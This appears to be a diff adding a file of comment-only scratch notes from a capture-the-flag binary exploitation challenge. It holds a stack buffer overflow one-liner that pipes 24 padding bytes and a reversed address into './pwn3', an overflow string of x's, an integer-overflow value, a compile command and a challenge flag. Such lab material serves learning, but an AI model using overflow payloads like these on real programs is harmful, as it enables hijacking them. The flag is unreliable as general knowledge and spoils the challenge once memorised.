@@ -1,0 +1,17 @@
+/*
+abcdefghijklmn''''stuvwxyz
+exploit:
+abcdefghijklmn''''stuvwx####cdefghijklmn''''stuvwxyz
+python -c 'print "x"*24+"\x08\x04\x84\x86"[::-1]'|./pwn3
+
+*/
+
+/*
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+*/
+
+/*
+2147483647
+NovaCTF{Th3_f0rc3_i5_5tR0NG_1N_YOu}
+gcc pwn1.c -o pwn1
+*/
